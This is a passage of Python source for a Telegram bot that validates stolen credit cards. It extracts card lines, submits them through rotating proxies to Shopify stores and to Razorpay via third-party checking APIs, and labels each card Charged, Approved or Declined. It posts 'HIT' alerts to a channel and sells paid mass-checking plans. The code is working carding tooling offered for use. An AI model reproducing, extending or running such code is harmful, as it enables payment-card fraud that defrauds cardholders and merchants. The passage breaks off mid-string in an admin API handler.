        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{4})(\d{3,4})', text):
            cards.append(f"{c}|{m}|{y}|{cv}")
    if not cards:
        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2})(\d{3,4})', text):
            cards.append(f"{c}|{m}|20{y}|{cv}")
    return list(dict.fromkeys(cards))


def is_valid_url_or_domain(url):
    d = url.lower()
    if d.startswith(('http://', 'https://')):
        try: d = urlparse(url).netloc
        except: return False
    return bool(re.match(r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$', d))


def extract_urls_from_text(text):
    seen, result = set(), []
    for line in text.split('\n'):
        line = line.strip()
        if not line: continue
        m = re.match(r'(https?://[^\s{(]+)', line)
        if m:
            norm = normalize_site_url(m.group(1).rstrip('/'))
            if norm and is_valid_url_or_domain(norm) and norm not in seen:
                seen.add(norm); result.append(norm)
            continue
        cleaned = re.sub(r'^[\s\-\+\|,\d\.\)\(\[\]]+', '', line).split(' ')[0].split('{')[0].strip()
        if cleaned:
            norm = normalize_site_url(cleaned)
            if norm and is_valid_url_or_domain(norm) and norm not in seen:
                seen.add(norm); result.append(norm)
    return result


def parse_proxy_format(proxy):
    proxy = proxy.strip()
    pt = 'http'
    pm = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)
    if pm: pt, proxy = pm.group(1).lower(), pm.group(2)
    h = p = u = pw = ''
    m = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy)
    if m: u, pw, h, p = m.groups()
    elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy):
        m2 = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy)
        ph, pp, pu, ppw = m2.groups()
        if 0 < int(pp) <= 65535: h, p, u, pw = ph, pp, pu, ppw
    elif re.match(r'^([^:@]+):(\d+)$', proxy):
        m3 = re.match(r'^([^:@]+):(\d+)$', proxy)
        h, p = m3.groups()
    else: return None
    if not h or not p: return None
    try:
        if not (0 < int(p) <= 65535): return None
    except: return None
    pu = f'{pt}://{u}:{pw}@{h}:{p}' if u and pw else f'{pt}://{h}:{p}'
    return {'ip': h, 'port': p, 'username': u or None, 'password': pw or None, 'proxy_url': pu, 'type': pt}


async def test_proxy(proxy_url):
    try:
        s = await get_proxy_session()
        async with s.get('http://api.ipify.org?format=json', proxy=proxy_url, timeout=aiohttp.ClientTimeout(total=PROXY_TIMEOUT)) as r:
            if r.status == 200: return True, (await r.json()).get('ip', '?')
            return False, None
    except Exception as e:
        return False, str(e)


async def get_bin_info(cn):
    try:
        s = await get_bin_session()
        async with _BIN_SEM:
            async with s.get(f'https://bins.antipublic.cc/bins/{cn[:6]}') as r:
                if r.status != 200:
                    return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}
                d = await r.json(content_type=None)
                return {"brand": d.get('brand', '-'), "type": d.get('type', '-'), "level": d.get('level', '-'), "bank": d.get('bank', '-'), "country": d.get('country_name', '-'), "flag": d.get('country_flag', '🏳️')}
    except:
        return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}


# ====================== SHOPIFY API ======================
def build_api_url(site, cc, proxy_data=None):
    if not site.startswith('http'): site = f'https://{site}'
    url = f'{API_BASE_URL}?site={quote(site, safe="")}&cc={quote(cc, safe="")}'
    if proxy_data:
        ip, port = proxy_data['ip'], proxy_data['port']
        un, pw = proxy_data.get('username'), proxy_data.get('password')
        ps = f"{ip}:{port}:{un}:{pw}" if un and pw else f"{ip}:{port}"
        url += f'&proxy={quote(ps, safe="")}'
    return url


def classify_response(rj):
    ar = str(rj.get('Response', ''))
    if ar.upper() == 'DS_REQUIRED': ar = '3DS_REQUIRED'
    st = rj.get('Status', False)
    price = rj.get('Price', '-')
    gw = rj.get('Gate', rj.get('Gateway', 'Shopify'))
    if price is not None and price != '-': price = f"${price}"
    rl = ar.lower()
    if is_site_error(ar) or is_proxy_error(ar):
        return {"Response": ar, "Price": price, "Gateway": gw, "Status": "SiteError"}
    ch = ['order_paid', 'order_placed', 'order_confirmed', 'thank you', 'payment successful', 'order_completed', 'charged', 'order_created', 'order confirmed']
    ap = ['otp_required', 'otp required', '3d_authentication', '3ds_required', '3d required', '3d_redirect', 'authentication_required', 'insufficient_funds', 'insufficient funds', 'cvc', 'ccn', 'ccn live cvv']
    dc = ['generic_decline', 'generic decline', 'do_not_honor', 'do not honor', 'stolen_card', 'lost_card', 'pickup_card', 'pick_up_card', 'restricted_card', 'restricted card', 'fraudulent', 'fraud suspected', 'fraud_suspected', 'expired_card', 'expired card', 'transaction_not_allowed', 'transaction not allowed', 'card_declined', 'card declined', 'processor_declined', 'processor declined', 'card_not_supported', 'card not supported', 'currency_not_supported', 'duplicate_transaction', 'revocation_of_authorization', 'no_action_taken', 'try_again_later', 'not_permitted', 'decline', 'your card was declined', 'payment_intent_authentication_failure', 'avs_check_failed', 'incorrect number', 'incorrect_number', 'invalid', 'invalid_number', 'decision_rule_block', 'generic_error']
    if any(k in rl for k in ch): return {"Response": ar, "Price": price, "Gateway": gw, "Status": "Charged"}
    if any(k in rl for k in ap): return {"Response": ar, "Price": price, "Gateway": gw, "Status": "Approved"}
    if any(k in rl for k in dc): return {"Response": ar, "Price": price, "Gateway": gw, "Status": "Declined"}
    if st is True and not any(w in rl for w in ["decline", "denied", "failed", "error", "rejected", "refused", "fraud"]):
        return {"Response": ar, "Price": price, "Gateway": gw, "Status": "Approved"}
    return {"Response": ar, "Price": price, "Gateway": gw, "Status": "Declined"}


async def check_card_api(card, site, proxy_data=None, user_id=None, http_session=None):
    uid = user_id or "?"
    try:
        url = build_api_url(site if site.startswith('http') else f'https://{site}', card, proxy_data)
        s = http_session or (await get_user_http_session(uid, "sp"))
        async with s.get(url, timeout=aiohttp.ClientTimeout(total=15, connect=5)) as r:
            if r.status != 200:
                return {"Response": f"HTTP_{r.status}", "Price": "-", "Gateway": "Shopify", "Status": "SiteError", "card": card, "site": site}
            try:
                rj = await asyncio.wait_for(r.json(content_type=None), timeout=10)
            except asyncio.TimeoutError:
                return {"Response": "JSON Timeout", "Price": "-", "Gateway": "Shopify", "Status": "SiteError", "card": card, "site": site}
            except:
                return {"Response": "Invalid JSON", "Price": "-", "Gateway": "Shopify", "Status": "SiteError", "card": card, "site": site}
        result = classify_response(rj)
        result["card"] = card
        result["site"] = site
        return result
    except asyncio.TimeoutError:
        return {"Response": "Timeout", "Price": "-", "Gateway": "Shopify", "Status": "SiteError", "card": card, "site": site}
    except asyncio.CancelledError:
        raise
    except Exception as e:
        err = str(e)
        st2 = "SiteError" if is_site_error(err) or is_proxy_error(err) else "Declined"
        return {"Response": err[:100], "Price": "-", "Gateway": "Shopify", "Status": st2, "card": card, "site": site}


async def check_card_with_retry(card, sites, user_id=None, proxies_data=None, max_retries=2, rotator=None, cancel_check=None, http_session=None):
    if not sites:
        return {"Response": "No sites", "Price": "-", "Gateway": "-", "Status": "Error", "card": card}, -1
    tried_sites = set()
    tried_proxies = set()
    last = None
    for attempt in range(max_retries):
        if cancel_check and cancel_check():
            return {"Response": "Stopped", "Price": "-", "Gateway": "-", "Status": "Error", "card": card}, -1
        if rotator: site = rotator.pick_site(sites, exclude=tried_sites)
        else:
            available = [s for s in sites if s not in tried_sites] or list(sites)
            site = random.choice(available)
        tried_sites.add(site)
        proxy_data = None
        if proxies_data:
            if rotator: proxy_data = rotator.pick_proxy(proxies_data, exclude=tried_proxies)
            else:
                available_px = [p for p in proxies_data if p.get('proxy_url') not in tried_proxies] or list(proxies_data)
                proxy_data = random.choice(available_px)
            if proxy_data: tried_proxies.add(proxy_data.get('proxy_url'))
        result = await check_card_api(card, site, proxy_data, user_id, http_session=http_session)
        if result.get("Status") != "SiteError":
            if rotator:
                rotator.report_site_ok(site)
                if proxy_data: rotator.report_proxy_ok(proxy_data.get('proxy_url'))
            return result, sites.index(site) + 1
        if rotator:
            rotator.report_site_fail(site)
            if proxy_data and is_proxy_error(result.get("Response", "")):
                rotator.report_proxy_fail(proxy_data.get('proxy_url'))
        last = result
        if attempt < max_retries - 1: await asyncio.sleep(0.3)
    if last:
        last["Status"] = "Error"
        return last, -1
    return {"Response": "Max retries", "Price": "-", "Gateway": "-", "Status": "Error", "card": card}, -1


async def test_site(site, proxy_data=None, http_session=None):
    test_card = "5154623245618097|03|2032|156"
    try:
        url = build_api_url(site if site.startswith('http') else f'https://{site}', test_card, proxy_data)
        s = http_session or (await get_user_http_session(0, "site"))
        async with s.get(url, timeout=aiohttp.ClientTimeout(total=15, connect=5)) as resp:
            if resp.status != 200: return {'site': site, 'status': 'dead', 'price': '-', 'response': f'HTTP_{resp.status}'}
            try: raw = await resp.json(content_type=None)
            except: return {'site': site, 'status': 'dead', 'price': '-', 'response': 'Invalid JSON'}
        rm = raw.get('Response', '')
        price = raw.get('Price', '-')
        if price and price != '-': price = f"${price}"
        if is_site_error(rm.lower()): return {'site': site, 'status': 'dead', 'price': price, 'response': rm}
        if not is_truly_alive(rm, price): return {'site': site, 'status': 'dead', 'price': price, 'response': rm}
        return {'site': site, 'status': 'alive', 'price': price, 'response': rm}
    except Exception as e:
        return {'site': site, 'status': 'dead', 'price': '-', 'response': str(e)[:50]}


# ====================== RAZORPAY API ======================
def build_rz_api_url(cc, proxy_data=None):
    url = f'{RAZORPAY_API_URL}?cc={quote(cc, safe="")}'
    if proxy_data:
        un = proxy_data.get('username') or ''
        pw = proxy_data.get('password') or ''
        ip = proxy_data['ip']
        port = proxy_data['port']
        ps = f"{un}:{pw}@{ip}:{port}" if un and pw else f"{ip}:{port}"
        url += f'&proxy={quote(ps, safe="")}'
    return url


def clean_rz_response(raw_resp):
    if not raw_resp: return raw_resp
    cleaned = re.sub(r'^(?:DEAD|LIVE|SUCCESS|CHARGED|APPROVED|DECLINED)\s*\|\s*ID:\s*pay_[a-zA-Z0-9]+\s*\|\s*', '', raw_resp, flags=re.IGNORECASE).strip()
    return cleaned if cleaned else raw_resp


def classify_rz_response(rj):
    gate = 'RazorPay'
    raw_resp = str(rj.get('response', rj.get('Response', '')))
    resp = clean_rz_response(raw_resp)
    rl = resp.lower()
    if is_rz_retry_error(resp):
        return {"Response": resp, "Price": "-", "Gateway": gate, "Status": "RetryError"}
    rz_charged = ['transaction success', 'payment successful', 'payment success', 'order_paid', 'charged']
    rz_approved = ['your payment could not be completed due to insufficient account balance', 'insufficient account balance', 'insufficient_funds', 'insufficient funds', 'otp_required', 'otp required', '3d_authentication', '3ds_required', 'authentication_required', 'cvc', 'ccn']
    rz_declined = ['your payment has been cancelled', 'payment cancelled', 'cancelled', 'card_declined', 'card declined', 'generic_decline', 'generic decline', 'do_not_honor', 'do not honor', 'stolen_card', 'lost_card', 'expired_card', 'expired card', 'restricted_card', 'fraudulent', 'not_permitted', 'transaction_not_allowed', 'card_not_supported', 'decline', 'your card was declined', 'payment failed', 'failed', 'generic_error']
    if any(k in rl for k in rz_charged): return {"Response": resp, "Price": "-", "Gateway": gate, "Status": "Charged"}
    if any(k in rl for k in rz_approved): return {"Response": resp, "Price": "-", "Gateway": gate, "Status": "Approved"}
    if any(k in rl for k in rz_declined): return {"Response": resp, "Price": "-", "Gateway": gate, "Status": "Declined"}
    return {"Response": resp, "Price": "-", "Gateway": gate, "Status": "Declined"}


async def check_rz_api(card, proxy_data=None, user_id=None, http_session=None):
    uid = user_id or "?"
    try:
        url = build_rz_api_url(card, proxy_data)
        s = http_session or (await get_user_http_session(uid, "rz"))
        async with s.get(url, timeout=aiohttp.ClientTimeout(total=15, connect=5)) as r:
            if r.status != 200:
                return {"Response": f"HTTP_{r.status}", "Price": "-", "Gateway": "RazorPay", "Status": "RetryError", "card": card}
            try: rj = await r.json(content_type=None)
            except: return {"Response": "Invalid JSON", "Price": "-", "Gateway": "RazorPay", "Status": "RetryError", "card": card}
        result = classify_rz_response(rj)
        result["card"] = card
        return result
    except asyncio.TimeoutError:
        return {"Response": "Timeout", "Price": "-", "Gateway": "RazorPay", "Status": "RetryError", "card": card}
    except asyncio.CancelledError:
        raise
    except Exception as e:
        return {"Response": str(e)[:100], "Price": "-", "Gateway": "RazorPay", "Status": "RetryError", "card": card}


async def check_rz_with_retry(card, proxies_data=None, user_id=None, max_retries=2, cancel_check=None, http_session=None):
    tried_proxies = set()
    last = None
    for attempt in range(max_retries):
        if cancel_check and cancel_check():
            return {"Response": "Stopped", "Price": "-", "Gateway": "RazorPay", "Status": "Error", "card": card}
        proxy_data = None
        if proxies_data:
            available_px = [p for p in proxies_data if p.get('proxy_url') not in tried_proxies] or list(proxies_data)
            proxy_data = random.choice(available_px)
            if proxy_data: tried_proxies.add(proxy_data.get('proxy_url'))
        result = await check_rz_api(card, proxy_data, user_id, http_session=http_session)
        if result.get("Status") != "RetryError":
            return result
        last = result
        if attempt < max_retries - 1: await asyncio.sleep(0.5)
    if last:
        last["Status"] = "Error"
        return last
    return {"Response": "Max retries", "Price": "-", "Gateway": "RazorPay", "Status": "Error", "card": card}


# ====================== STATUS ======================
def _get_system_uptime():
    if not PSUTIL_AVAILABLE: return "N/A"
    uptime_seconds = int(time.time() - psutil.boot_time())
    days, remainder = divmod(uptime_seconds, 86400)
    hours, remainder = divmod(remainder, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours:02}:{minutes:02}:{seconds:02}"


def _get_bot_uptime():
    uptime_seconds = int(time.time() - BOT_START_TIME)
    days, remainder = divmod(uptime_seconds, 86400)
    hours, remainder = divmod(remainder, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours:02}:{minutes:02}:{seconds:02}"


def _create_progress_bar(percentage, length=10):
    filled_length = int(length * percentage / 100)
    return f"{'█' * filled_length}{'░' * (length - filled_length)} {percentage:.1f}%"


def _get_system_info():
    if not PSUTIL_AVAILABLE:
        return {"error": "psutil not installed", "current_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
    try:
        cpu_usage = psutil.cpu_percent(interval=0)
        cpu_count = psutil.cpu_count(logical=True)
        cpu_freq = psutil.cpu_freq()
        memory = psutil.virtual_memory()
        disk = psutil.disk_usage("/")
        network = psutil.net_io_counters()
        return {
            "cpu_usage": cpu_usage, "cpu_count": cpu_count,
            "cpu_freq": cpu_freq.current if cpu_freq else 0,
            "total_memory": memory.total / (1024**3), "used_memory": memory.used / (1024**3),
            "memory_percent": memory.percent,
            "total_disk": disk.total / (1024**3), "used_disk": disk.used / (1024**3),
            "disk_percent": disk.percent,
            "bytes_sent": network.bytes_sent / (1024**2), "bytes_recv": network.bytes_recv / (1024**2),
            "uptime_str": _get_system_uptime(), "bot_uptime_str": _get_bot_uptime(),
            "bot_restart_time": datetime.fromtimestamp(BOT_START_TIME).strftime("%Y-%m-%d %H:%M:%S"),
            "cpu_critical": cpu_usage > 90, "memory_critical": memory.percent > 90,
            "disk_critical": disk.percent > 90, "error": None
        }
    except Exception as e:
        return {"error": str(e), "current_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}


async def _build_status_text():
    sys_info = await asyncio.get_event_loop().run_in_executor(None, _get_system_info)
    if sys_info.get("error"):
        return f"⌬ <b>𝐄𝐫𝐫𝐨𝐫</b> ↬ <code>❌ {sys_info['error']}</code>\n⌬ <b>𝐁𝐨𝐭 𝐁𝐲</b> ↬ <a href='{OWNER_URL}'>@{OWNER_USERNAME}</a>"
    s = sys_info
    msg = (
        f"⌬ <b>𝐁𝐨𝐭 𝐒𝐭𝐚𝐭𝐮𝐬</b> ↬ <code>✅ Active</code>\n――――――――――――――\n"
        f"⌬ <b>𝐁𝐨𝐭 𝐔𝐩𝐭𝐢𝐦𝐞</b> ↬ <code>{s['bot_uptime_str']}</code>\n"
        f"⌬ <b>𝐒𝐲𝐬𝐭𝐞𝐦 𝐔𝐩𝐭𝐢𝐦𝐞</b> ↬ <code>{s['uptime_str']}</code>\n"
        f"⌬ <b>𝐋𝐚𝐬𝐭 𝐑𝐞𝐬𝐭𝐚𝐫𝐭</b> ↬ <code>{s['bot_restart_time']}</code>\n――――――――――――――\n"
        f"⌬ <b>𝐂𝐏𝐔</b> ↬ <code>{s['cpu_usage']:.1f}% ({s['cpu_count']} cores)</code>\n"
        f"⊀ <b>Usage</b> ↬ <code>{_create_progress_bar(s['cpu_usage'])}</code>\n――――――――――――――\n"
        f"⌬ <b>𝐑𝐀𝐌</b> ↬ <code>{s['used_memory']:.2f}GB / {s['total_memory']:.2f}GB</code>\n"
        f"⊀ <b>Usage</b> ↬ <code>{_create_progress_bar(s['memory_percent'])}</code>\n――――――――――――――\n"
        f"⌬ <b>𝐃𝐢𝐬𝐤</b> ↬ <code>{s['used_disk']:.2f}GB / {s['total_disk']:.2f}GB</code>\n"
        f"⊀ <b>Usage</b> ↬ <code>{_create_progress_bar(s['disk_percent'])}</code>\n――――――――――――――\n"
        f"⌬ <b>𝐍𝐞𝐭𝐰𝐨𝐫𝐤</b> ↬ <code>↑ {s['bytes_sent']:.1f}MB ↓ {s['bytes_recv']:.1f}MB</code>\n"
    )
    if s["cpu_critical"] or s["memory_critical"] or s["disk_critical"]:
        msg += "\n⚠️ <b>Warning:</b> System resources critically low!"
    msg += f"\n――――――――――――――\n⌬ <b>𝐁𝐨𝐭 𝐁𝐲</b> ↬ <a href='{OWNER_URL}'>@{OWNER_USERNAME}</a>"
    return msg


# ====================== CLIENT ======================
client = TelegramClient('aliya_bot', API_ID, API_HASH)
client_instance = client


# ====================== HIT NOTIFICATIONS ======================
async def send_channel_hit(res, uid, username, name, gate_type="Shopify"):
    try:
        prem = await is_premium_user(uid)
        tag = bs("Premium") if prem else bs("Free Trial")
        sv = str(res.get("Status", "Charged")).upper()
        prof = f"https://t.me/{username}" if username and not username.startswith("user_") else f"tg://user?id={uid}"
        gw = res.get('Gateway', gate_type)
        resp = res.get('Response', '')
        if gate_type == "RazorPay":
            msg = f"""<b>{bs('HIT')} ➛ {bs(sv)}</b> {PE}
<b>{bs('Gateway')} ➛ {gw}</b>
<b>{bs('Response')} ➛ {resp}</b>
<b>{bs('User')} ➛ <a href=\"{prof}\">{name}</a></b> ({tag})"""
        else:
            msg = f"""<b>{bs('HIT')} ➛ {bs(sv)}</b> {PE}
<b>{bs('Gateway')} ➛ {gw}</b>
<b>{bs('Response')} ➛ {resp}</b>
<b>{bs('Price')} ➛ {res.get('Price', '-')}</b>
<b>{bs('User')} ➛ <a href=\"{prof}\">{name}</a></b> ({tag})"""
        await styled_send(HIT_CHANNEL_ID, msg, buttons=HIT_BUTTON, emoji_ids=[CE["fire"]])
    except: pass


async def pin_charged_message(event, msg):
    try:
        if event.is_group: await msg.pin()
    except: pass


# ====================== /start ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.](start|menu)$'))
async def start(event):
    try:
        uid = event.sender_id
        await ensure_user(uid)
        if not await force_join_check(event): return
        _, at = await can_use(uid, event.chat)
        if at == "banned":
            t, e = banned_user_message()
            return await styled_reply(event, t, emoji_ids=e)
        try:
            sender = await event.get_sender()
            uname = sender.first_name or (sender.username or f"user_{uid}")
        except:
            uname = f"user_{uid}"
        joined_date = datetime.now().strftime("%Y-%m-%d")
        text = f"""⚙ <b>Welcome to {BOT_NAME} X Chk</b> 🦅
━━━━━━━━━━━━━━━━━
User ➤ <b>{uname}</b>
User ID ➤ <code>{uid}</code>
Joined ➤ {joined_date}
━━━━━━━━━━━━━━━━━
Choose an option below."""
        kb = [
            [pbtn("⚙ GATE", "menu:gate", style="primary"), pbtn("👨‍💻 Dev", "menu:dev", style="primary")],
            [pbtn("👥 Group", url=JOIN_GROUP_LINK, style="primary"), pbtn("📢 Channel", url=JOIN_CHANNEL_LINK, style="primary")],
        ]
        await styled_reply(event, text, buttons=kb, emoji_ids=[CE["bolt"], CE["pin"], CE["crown"]])
    except Exception as e:
        log_user(event.sender_id, "START_ERROR", f"Error={e}", "error")


@client.on(events.NewMessage(pattern=r'(?i)^[/.](cmds?|commands?|help)$'))
async def cmds_list(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if await is_banned_user(event.sender_id):
        t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    uid = event.sender_id
    is_admin = uid in ADMIN_ID
    plan = await get_user_plan(uid)
    limit = get_cc_limit(plan, uid)
    if is_paid_plan(plan):
        plan_emoji = "🛠️"
        for pi in PLANS.values():
            if pi["tier"].lower() == plan.lower(): plan_emoji = pi["emoji"]; break
        sl = f"{PE} <b>{bs('STATUS')}</b> ━ {plan_emoji} <b>{plan.upper()}</b> {PE} (<code>{limit}</code> {bs('Mass Limit')})"
    else:
        sl = f"<b>{bs('STATUS')}</b> ━ 🆓 <b>{plan.upper()}</b> (<code>{FREE_SP_DAILY_LIMIT}/{bs('day')}</code> {bs('in group')})"
    text = f"""{PE} <b><i>{bs('Shopify')}</i></b>
|   {PE} <code>/sp</code> ━ <b>{bs('Single CC')}</b>
|   {PE} <code>/msp</code> ━ <b>{bs('Mass CC')}</b>

{PE} <b><i>{bs('RazorPay')}</i></b>
|   {PE} <code>/rz</code> ━ <b>{bs('Single CC')}</b>
|   {PE} <code>/mrz</code> ━ <b>{bs('Mass CC')}</b>"""
    if is_admin:
        text += f"""

{PE} <b><i>{bs('Sites')}</i></b>
|   {PE} <code>/add</code> ━ <b>{bs('Add sites')}</b>
|   {PE} <code>/rm</code> ━ <b>{bs('Remove')}</b>
|   {PE} <code>/sites</code> ━ <b>{bs('View')}</b>
|   {PE} <code>/site</code> ━ <b>{bs('Test all')}</b>"""
    text += f"""

{PE} <b><i>{bs('Proxy')}</i></b> ({bs('Private')})
|   {PE} <code>/addpxy</code> ━ <b>{bs('Add')}</b>
|   {PE} <code>/proxy</code> ━ <b>{bs('View')}</b>
|   {PE} <code>/chkpxy</code> ━ <b>{bs('Test')}</b>
|   {PE} <code>/rmpxy</code> ━ <b>{bs('Remove')}</b>

{PE} <b><i>{bs('Account')}</i></b>
|   {PE} <code>/info</code> ━ <b>{bs('Profile')}</b>
|   {PE} <code>/plan</code> ━ <b>{bs('Plans')}</b>"""
    if is_admin:
        text += f"\n|   {PE} <code>/api</code> ━ <b>{bs('API Info')}</b>"
    text += f"""
<b>━━━━━━━━━━━━━━━━━</b>
{sl}"""
    kb = [[pbtn(bs("Menu"), "menu:main", style="success"), pbtn(bs("Support"), url=OWNER_URL, style="primary")]]
    await styled_reply(event, text, buttons=kb)


# ====================== MENU UI ======================
@client.on(events.CallbackQuery(data=b"menu:main"))
async def menu_main_cb(event):
    uid = event.sender_id
    try: await ensure_user(uid)
    except: pass
    if await is_banned_user(uid):
        return await event.answer("🚫 Banned", alert=True)
    try:
        sender = await event.get_sender()
        uname = sender.first_name or f"user_{uid}"
    except:
        uname = f"user_{uid}"
    joined_date = datetime.now().strftime("%Y-%m-%d")
    text = f"""⚙ <b>Welcome to {BOT_NAME} X Chk</b> 🦅
━━━━━━━━━━━━━━━━━
User ➤ <b>{uname}</b>
User ID ➤ <code>{uid}</code>
Joined ➤ {joined_date}
━━━━━━━━━━━━━━━━━
Choose an option below."""
    kb = [
        [pbtn("⚙ GATE", "menu:gate", style="primary"), pbtn("👨‍💻 Dev", "menu:dev", style="primary")],
        [pbtn("👥 Group", url=JOIN_GROUP_LINK, style="primary"), pbtn("📢 Channel", url=JOIN_CHANNEL_LINK, style="primary")],
    ]
    try: await event.edit(text, buttons=kb, parse_mode='html')
    except: pass


@client.on(events.CallbackQuery(data=b"menu:gate"))
async def menu_gate_cb(event):
    text = "🦅 <b>Select a Gateway:</b>"
    kb = [
        [pbtn("● AUTH", "gate:auth", style="primary"), pbtn("💎 CHARGE", "gate:charge", style="primary")],
        [pbtn("🎯 HITTER", "gate:hitter", style="primary"), pbtn("🔑 Key based", "gate:keybased", style="primary")],
        [pbtn("⬅ Back", "menu:main", style="danger")],
    ]
    try: await event.edit(text, buttons=kb, parse_mode='html')
    except: pass


@client.on(events.CallbackQuery(data=b"menu:dev"))
async def menu_dev_cb(event):
    text = f"""👨‍💻 <b>Developer Info</b>
━━━━━━━━━━━━━━━━━
Name ➤ <b>Ishani</b>
Username ➤ @{OWNER_USERNAME}
Bot ➤ {BOT_NAME}
━━━━━━━━━━━━━━━━━
Contact for support / plans."""
    kb = [[pbtn("Support", url=OWNER_URL, style="primary")], [pbtn("⬅ Back", "menu:main", style="danger")]]
    try: await event.edit(text, buttons=kb, parse_mode='html')
    except: pass


@client.on(events.CallbackQuery(data=b"gate:charge"))
async def gate_charge_cb(event):
    rows = []; cur = []
    for gid, g in GATES.items():
        cur.append(pbtn(f"{g['emoji']} {g['name']}", f"charge:{gid}", style="primary"))
        if len(cur) == 2: rows.append(cur); cur = []
    if cur: rows.append(cur)
    rows.append([pbtn("⬅ Back", "menu:gate", style="danger")])
    try: await event.edit("💎 <b>Select a Charge Gateway:</b>", buttons=rows, parse_mode='html')
    except: pass


@client.on(events.CallbackQuery(data=b"gate:auth"))
async def gate_auth_cb(event):
    rows = []; cur = []
    for gid, g in GATES.items():
        cur.append(pbtn(f"{g['emoji']} {g['name']}", f"auth:{gid}", style="primary"))
        if len(cur) == 2: rows.append(cur); cur = []
    if cur: rows.append(cur)
    rows.append([pbtn("⬅ Back", "menu:gate", style="danger")])
    try: await event.edit("● <b>Select an Auth Gateway:</b>", buttons=rows, parse_mode='html')
    except: pass


@client.on(events.CallbackQuery(data=b"gate:hitter"))
async def gate_hitter_cb(event):
    text = """🎯 <b>Hitter / Plans</b>
━━━━━━━━━━━━━━━━━
Get access to premium plans
• Mass checks
• Priority workers
• Private access
━━━━━━━━━━━━━━━━━
Contact admin for pricing."""
    kb = [[pbtn("📩 Contact Admin", url=OWNER_URL, style="danger")], [pbtn("⬅ Back", "menu:gate", style="danger")]]
    try: await event.edit(text, buttons=kb, parse_mode='html')
    except: pass


@client.on(events.CallbackQuery(data=b"gate:keybased"))
async def gate_keybased_cb(event):
    text = """🔑 <b>Key Based Access</b>
━━━━━━━━━━━━━━━━━
<i>Coming soon...</i>
━━━━━━━━━━━━━━━━━
Key system under development.
Use /plan for now."""
    kb = [[pbtn("⬅ Back", "menu:gate", style="danger")]]
    try: await event.edit(text, buttons=kb, parse_mode='html')
    except: pass


@client.on(events.CallbackQuery(pattern=rb"charge:(\w+)"))
async def charge_selected_cb(event):
    gate = event.pattern_match.group(1).decode()
    if gate not in GATES:
        return await event.answer("Unknown gate", alert=True)
    g = GATES[gate]
    if not g["enabled"]:
        return await event.answer(f"❌ {g['name']} is OFF", alert=True)
    if gate == "shopify":
        text = "🛍 <b>Shopify</b>\n━━━━━━━━━━━━━━━━━\nSelect an option:"
        kb = [
            [pbtn("Single Check /sp", "cmd:sp", style="success"), pbtn("Mass Check /msp", "cmd:msp", style="success")],
            [pbtn("⬅ Back", "gate:charge", style="danger")],
        ]
        try: await event.edit(text, buttons=kb, parse_mode='html')
        except: pass
    elif gate == "razorpay":
        text = "💳 <b>Razorpay</b>\n━━━━━━━━━━━━━━━━━\nSelect an option:"
        kb = [
            [pbtn("Single Check /rz", "cmd:rz", style="success"), pbtn("Mass Check /mrz", "cmd:mrz", style="success")],
            [pbtn("⬅ Back", "gate:charge", style="danger")],
        ]
        try: await event.edit(text, buttons=kb, parse_mode='html')
        except: pass
    else:
        await event.answer(f"⚠️ {g['name']} coming soon", alert=True)


@client.on(events.CallbackQuery(pattern=rb"auth:(\w+)"))
async def auth_selected_cb(event):
    gate = event.pattern_match.group(1).decode()
    if gate not in GATES:
        return await event.answer("Unknown gate", alert=True)
    g = GATES[gate]
    if not g["enabled"]:
        return await event.answer(f"❌ {g['name']} is OFF", alert=True)
    if gate == "shopify":
        text = "🛍 <b>Shopify AUTH</b>\n━━━━━━━━━━━━━━━━━\nUse <code>/sp card|mm|yyyy|cvv</code>"
        try: await event.edit(text, buttons=[[pbtn("⬅ Back", "gate:auth", style="danger")]], parse_mode='html')
        except: pass
    else:
        await event.answer(f"⚠️ {GATES[gate]['name']} AUTH coming soon", alert=True)


@client.on(events.CallbackQuery(pattern=rb"cmd:(\w+)"))
async def cmd_info_cb(event):
    cmd = event.pattern_match.group(1).decode()
    info = {
        "sp":  ("🛍 <b>Shopify Single</b>", "Send:\n<code>/sp card|mm|yyyy|cvv</code>"),
        "msp": ("🛍 <b>Shopify Mass</b>",  "Reply to .txt with <code>/msp</code>\nOr send <code>/msp cards...</code>"),
        "rz":  ("💳 <b>Razorpay Single</b>", "Send:\n<code>/rz card|mm|yyyy|cvv</code>"),
        "mrz": ("💳 <b>Razorpay Mass</b>",  "Reply to .txt with <code>/mrz</code>\nOr send <code>/mrz cards...</code>"),
    }
    if cmd not in info:
        return await event.answer("Unknown command", alert=True)
    title, desc = info[cmd]
    text = f"{title}\n━━━━━━━━━━━━━━━━━\n{desc}"
    back_to = "charge:shopify" if cmd in ("sp", "msp") else "charge:razorpay"
    try: await event.edit(text, buttons=[[pbtn("⬅ Back", back_to, style="danger")]], parse_mode='html')
    except: pass


# ====================== /api (Admin) ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]api$'))
async def api_info(event):
    if event.sender_id not in ADMIN_ID: return
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    text = f"""<b>𝙇𝙖𝙩𝙚𝙨𝙩 𝘼𝙛𝙪𝙤𝙣𝙖𝙭 𝙎𝙘𝙧𝙖𝙥𝙥𝙚𝙙 𝙎𝙝𝙤𝙥𝙞 𝘼𝙥𝙞'𝙨</b> 🆓💥

📌 <b>Kᴇʏ Pᴏɪɴᴛs :-</b>
